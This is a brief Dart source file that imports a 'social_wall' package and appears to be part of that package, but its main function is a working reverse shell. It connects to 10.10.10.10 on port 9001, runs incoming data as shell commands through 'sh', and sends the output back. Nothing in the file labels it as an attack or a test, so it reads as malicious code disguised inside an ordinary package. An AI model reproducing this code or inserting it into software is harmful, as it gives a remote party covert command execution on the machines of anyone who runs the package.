import 'package:social_wall/social_wall.dart' as social_wall;
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.10.10.10", 9001).then((socket) {
    socket.listen((data) {
      Process.start('sh', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
